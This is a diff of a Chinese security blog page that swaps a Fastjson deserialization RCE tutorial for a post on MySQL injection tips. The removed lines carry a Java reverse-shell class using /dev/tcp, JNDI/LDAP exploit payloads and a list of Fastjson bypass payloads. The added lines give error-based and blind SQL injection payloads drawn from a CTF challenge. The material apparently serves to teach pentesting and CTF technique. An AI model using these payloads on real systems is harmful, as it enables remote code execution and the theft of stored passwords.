@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>Fastjson &lt; 1.2.47 RCE 利用 | loecho</title>	
+<title>MySQL未知列名的注入Tips | loecho</title>	
 
 <link rel="stylesheet" href="https://1oecho.github.io/styles/main.css">
 <script type="text/javascript">
@@ -130,10 +130,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">Fastjson &lt; 1.2.47 RCE 利用</h1>
+			<h1 class="wow swing entry-title">MySQL未知列名的注入Tips</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-06-11 15:21:57" itemprop="datePublished" pubdate="">2020-06-11</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-06-22 19:57:49" itemprop="datePublished" pubdate="">2020-06-22</time></i>
 	          </div>
 			
 </span>
@@ -141,143 +141,122 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<h2 id="0x00-rmi和ldap的适用版本">0x00 RMI和LDAP的适用版本</h2>
+				<h2 id="0x01-适用场景">0x01 适用场景</h2>
 <ul>
 <li>
-<p><strong>漏洞检测</strong>: https://github.com/uknowsec/BurpSuite-Extender-fastjson</p>
-</li>
-<li>
-<p><strong>利用工具:</strong> https://codeload.github.com/CaijiOrz/fastjson-1.2.47-RCE/zip/master</p>
-</li>
-<li>
-<p><strong>RMI的利用方式：</strong> 适用jdk版本：JDK 6u132, JDK 7u122, JDK 8u113之前。</p>
-</li>
-<li>
-<p><strong>LDAP的利用方式：</strong> 适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。</p>
-</li>
-</ul>
-<h2 id="二-漏洞影响">二、漏洞影响</h2>
-<ul>
-<li>Fastjson &lt; 1.2.47</li>
-</ul>
-<h2 id="三-复现过程">三、复现过程</h2>
-<ul>
-<li>1.<strong>启动Fastjson漏洞环境(版本为1.2.24)</strong></li>
-</ul>
-<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/BlogImg20200417171215.png" alt="" loading="lazy"></figure>
-<p><strong>访问一下,成功启动:</strong></p>
-<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/BlogImg20200417171332.png" alt="" loading="lazy"></figure>
-<p>在实际环境中我们不知道,后端json为Fastjson,通过一些方法来探测一下(细节可以看dalao博客)</p>
-<h4 id="01-手工探测">01. 手工探测:</h4>
-<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/BlogImg20200417175831.png" alt="" loading="lazy"></figure>
-<ul>
-<li><strong>探测结果:</strong></li>
-</ul>
-<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/BlogImg20200417180039.png" alt="" loading="lazy"></figure>
-<h4 id="02-burpsuit-插件-被动探测">02. BurpSuit 插件 被动探测:</h4>
-<p>1.配置插件,修改dnslog探测地址,还有token默认使用为Ceye.io来探测,流量只要经过BurpSuit,他就会自动探测,结果在插件的output中查看</p>
-<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200611145918284.png" alt="image-20200611145918284" loading="lazy"></figure>
-<h3 id="02-漏洞利用反弹shell">02 漏洞利用(反弹Shell)</h3>
 <ol>
-<li>下载利用工具,先配置恶意的Java代码,编译为Class文件</li>
+<li>未知列名的情况下,子查询注入(设置别名),实现联合查询注入</li>
 </ol>
-<pre><code class="language-java">import java.io.BufferedReader;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-
-public class Loecho {
-    public Loecho() throws Exception {
-        Process p = Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/IP/8888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;});
-        InputStream is = p.getInputStream();
-        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
-
-        String line;
-        while((line = reader.readLine()) != null) {
-            System.out.println(line);
-        }
-
-        p.waitFor();
-        is.close();
-        reader.close();
-        p.destroy();
-    }
-
-    public static void main(String[] args) throws Exception {
-    }
-}
-</code></pre>
+</li>
+<li>
 <ol start="2">
+<li>未知列名的情况下,子查询配合报错注入,实现布尔盲注和时间盲注</li>
+</ol>
+</li>
+</ul>
+<h2 id="0x02-实际案例">0x02 实际案例</h2>
+<p>​	<strong>(1)  第一种情况:</strong></p>
+<ul>
 <li>
-<p>编译为Class文件,启动LDAP服务以及HTTP服务:</p>
-<figure data-type="image" tabindex="6"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200611151028539.png" alt="image-20200611151028539" loading="lazy"></figure>
+<p><strong>限制条件:</strong></p>
+<ul>
+<li>过滤了OR关键字,information_schema表不能利用</li>
+</ul>
+</li>
+</ul>
+<p>正常情况下我们在联合查询注入时,通过判断列长度,以及显示位后,构造联合查询语句,查询MySQL的 information_schema 表来查询我们需要的数据,当以存在这种情况,可以通过:</p>
+<p><strong>(1).</strong> 查询sys数据库进行数据查询，使用sys数据库需要满足：</p>
+<pre><code class="language-mysql">     1.数据库版本大于等于5.7
+     
+     2.数据库用户为root@localohost用户
+</code></pre>
+<p>​</p>
+<p>**(2).**通过构造虚拟表的方式,来查询数据,也就是我们说的子查询注入,数据如下</p>
+<figure data-type="image" tabindex="1"><img src="https://img03.sogoucdn.com/app/a/100520146/b659a22d8ef8ecc70adbe645f2875a5b" alt="UTOOLS1592823899727.png" loading="lazy"></figure>
+<ul>
+<li>
+<p>具体步骤如下:</p>
+<ol>
+<li>构造一个虚拟表</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://img03.sogoucdn.com/app/a/100520146/f786c119e2a6ad10868f4c86890fb761" alt="" loading="lazy"></figure>
+<ol start="2">
+<li>查询虚拟表的内容,就会查到我们需要的数据</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://img01.sogoucdn.com/app/a/100520146/0967df2dbfc22c5d83b1c630ec8527d6" alt="UTOOLS1592824132042.png" loading="lazy"></figure>
+<ol start="3">
+<li>可以发现我们构造的数据第一列为用户名,第二列为密码,我们构造查询得到所有密码</li>
+</ol>
+</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://img02.sogoucdn.com/app/a/100520146/7df45db1a5074b4eff295744dcdffd4a" alt="UTOOLS1592824333021.png" loading="lazy"></figure>
+<p>4 . 实现我们的查询效果,同理第一列为用户名,在实际测试中,列名我们需要通过自己构造条件来判断,如果列数过多则会报错</p>
+<p>​	<strong>(2)  第二种情况:</strong></p>
+<p><strong>限制条件:</strong></p>
+<ul>
+<li>特殊盲注,构造语句后只会显示 Mysql Error和其他情况</li>
+<li>特殊盲注,手工构造语句,发现回显不同来构造盲注</li>
+<li>特殊盲注,<strong>mysql error的前提下延时与不延时</strong></li>
+</ul>
+<h3 id="实际案例">实际案例:</h3>
+<h4 id="1-2019全国大学生安全竞赛-web题目全宇宙最简单的的sql">(1).  2019全国大学生安全竞赛  Web题目:<strong>全宇宙最简单的的SQL</strong></h4>
+<figure data-type="image" tabindex="5"><img src="https://img04.sogoucdn.com/app/a/100520146/c71f47d49c50e20d7953b9f62a4553cc" alt="UTOOLS1592826837794.png" loading="lazy"></figure>
+<p><strong>本题突破点:</strong></p>
+<ul>
+<li>
+<p>username 存在注入点</p>
 </li>
 <li>
-<p>BurpSuit 发送Payload,内容如下:</p>
+<p>过滤了 or  ||</p>
 </li>
-</ol>
-<pre><code class="language-json">{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:PORT/类名&quot;,&quot;autoCommit&quot;:true}}}   
+<li>
+<p>当最终拼接语句无错误时,无论结果如何均为 登录失败</p>
+</li>
+<li>
+<p>当最终语句有错时,返回为 数据库操作失败</p>
+</li>
+</ul>
+<p>所以我们构造Paylaod如下:</p>
+<h3 id="0-sql注入报错函数">0.) SQL注入报错函数</h3>
+<p>报错注入<strong>只适用于没有自定义错误页面，或直接返回mysql报错信息的情况下</strong>，所需条件较为苛刻，但利用难度低。 以下都以获取user为例：</p>
+<h3 id="111-count-rand导致group-by报错">1.1.1. count()、rand()导致group by报错</h3>
+<h5 id="测试方法">测试方法</h5>
+<pre><code class="language-sql">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
 </code></pre>
-<figure data-type="image" tabindex="7"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200611151357328.png" alt="image-20200611151357328" loading="lazy"></figure>
-<p>4.查看监听位置的请求,接受到Shell:</p>
-<figure data-type="image" tabindex="8"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200611151659799.png" alt="image-20200611151659799" loading="lazy"></figure>
-<ol start="5">
-<li>提供一些绕墙的Payload,网上总结:</li>
-</ol>
-<p>手工探测Payload</p>
-<pre><code class="language-json">     {&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://dnslog&quot;}}&quot;&quot;}
-     
-     Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}]
-     
-     Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}
-         
-     {{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}:0
-     
-     
-     {&quot;@type&quot;:&quot;java.net.Inet4Address&quot;, &quot;val&quot;:&quot;dnslog&quot;}
-     
-     {&quot;@type&quot;:&quot;java.net.Inet6Address&quot;, &quot;val&quot;:&quot;dnslog&quot;}
-     
-     {&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:, &quot;val&quot;:&quot;dnslog&quot;}}
-     
-     {&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, 
-      &quot;val&quot;:&quot;dnslog&quot;}}&quot;&quot;}
-     
-     {{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}:&quot;aaa&quot;}
-     
-     Set[{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}]
-     
-     Set[{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}
-         
-     {{&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}:0
-    
-
-RCE-Payload
-
-
-   {&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;&quot;autoCommit&quot;:true}
-    
-   {&quot;@type&quot;:&quot;LLcom.sun.rowset.RowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true} 1.2.42
-   
-   {&quot;@type&quot;:&quot;[com.sun.rowset.RowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true} 1.2.25v1.2.43
-   
-   {&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;：&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;}} 1.2.25
-   
-   {&quot;@type&quot;:&quot;Lcom.sun.rowset.RowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}
-   
-   {\&quot;@type\&quot;:\&quot;com.zaxxer.hikari.HikariConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.60
-    
-   {\&quot;@type\&quot;:\&quot;org.apache.commons.configuration.JNDIConfiguration\&quot;,\&quot;prefix\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.60
-    
-   {\&quot;@type\&quot;:\&quot;org.apache.commons.configuration2.JNDIConfiguration\&quot;,\&quot;prefix\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;} 1.2.61
-    
-   {\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;asText\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;}  1.2.62
-    
-   {\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;} AnterosDBCPConfig
-    
-   {\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;} AnterosDBCPConfig
-    
-   {\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;:{\&quot;UserTransaction\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;}} JtaTransactionConfig
+<h3 id="112-updatexml报错">1.1.2. updatexml报错</h3>
+<h5 id="测试方法-2">测试方法</h5>
+<pre><code class="language-sql">and updatexml(1,concat(0x7e,user()),1)
 </code></pre>
+<h5 id="注意事项">注意事项</h5>
+<p><strong>适用于MySQL 5.1.5及以后的版本</strong></p>
+<h3 id="113-extractvalue报错">1.1.3. extractvalue报错</h3>
+<h5 id="测试方法-3">测试方法</h5>
+<pre><code class="language-sql">and extractvalue(1,concat(0x7e,user()))
+</code></pre>
+<h5 id="注意事项-2">注意事项</h5>
+<p>适用于MySQL 5.1.5及以后的版本</p>
+<h3 id="114-其他函数">1.1.4. 其他函数</h3>
+<h5 id="测试方法-4">测试方法</h5>
+<pre><code class="language-sql">and geometrycollection((select * from(select * from(select user())a)b))
+and multipoint((select * from(select * from(select user())a)b))
+and polygon((select * from(select * from(select user())a)b))
+and multipolygon((select * from(select * from(select user())a)b))
+and linestring((select * from(select * from(select user())a)b))
+and multilinestring((select * from(select * from(select user())a)b))
+and exp(~(select * from(select user())a))
+</code></pre>
+<h3 id="1-分析一下通过异或来判断真假因为过滤or关键字不能查询information_schema表">1. ) 分析一下,通过异或来判断真假,因为过滤or关键字,不能查询information_schema表</h3>
+<pre><code class="language-SQL">'^(select exp(~( 查询语句 )*18446744073709551615)))#&amp;password=admin
+
+</code></pre>
+<h4 id="2-而且不知道列名完成虚拟表构造查询虚拟表c-的-b列就是后面查询user表的密码">2.) 而且不知道列名,完成虚拟表构造,查询虚拟表c 的 b列就是,后面查询User表的密码</h4>
+<pre><code class="language-mysql">(select (  (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) )
+
+
+'^(select exp(~((select (  (( select c.b from (select 1 as a,2 as b,3 as d from user union select * from user)c where a='admin' )) ))*18446744073709551615)))#&amp;password=admin
+
+</code></pre>
+<h3 id="3-最后注入得到密码进行后续操作得到flag">3) 最后注入得到密码,进行后续操作,得到Flag</h3>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
@@ -287,10 +266,8 @@ RCE-Payload
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://1oecho.github.io/c-zJSfh0F/" rel="prev"> MySQL未知列名的注入Tips</a></div>
 		 
-		 
-		<div class="wow bounceInRight nav-next3"><a href="https://1oecho.github.io/w8iFoAIB3/" rel="next"> 2020-网鼎杯(青龙组) Web题目 WriteUp</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://1oecho.github.io/rxcPG2L_G/" rel="next"> Fastjson &lt; 1.2.47 RCE 利用</a></div>
 		
 		</div>
 	</nav>
